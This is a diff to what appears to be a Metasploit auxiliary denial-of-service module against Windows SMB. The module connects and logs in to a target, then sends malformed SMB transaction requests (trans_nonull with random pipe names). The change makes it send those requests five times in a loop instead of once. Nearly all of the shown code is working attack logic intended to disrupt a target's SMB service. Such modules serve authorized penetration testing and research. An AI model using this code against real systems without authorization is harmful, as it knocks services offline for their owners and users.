@@ -30,21 +30,23 @@ class Auxiliary::Dos::Windows::Smb::TRANS_PIPE_NONULL < Msf::Auxiliary
 
 	def run
 
-		print_status("Sending a bad SMB transaction request...");
+		print_status("Connecting to the target system...");
 
 		connect
 		smb_login
 
 		begin
-			self.simple.client.trans_nonull(
-				"\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}", 
-				'', 
-				Rex::Text.rand_text_alphanumeric(rand(16)+1), 
-				3, 
-				[1,0,1].pack('vvv'), 
-				true
-			)
-
+			1.upto(5) do |i|
+				print_status("Sending bad SMB transaction request #{i.to_s}...");
+				self.simple.client.trans_nonull(
+					"\\#{Rex::Text.rand_text_alphanumeric(rand(16)+1)}", 
+					'', 
+					Rex::Text.rand_text_alphanumeric(rand(16)+1), 
+					3, 
+					[1,0,1].pack('vvv'), 
+					true
+				)
+			end
 		rescue ::Interrupt
 			return
 
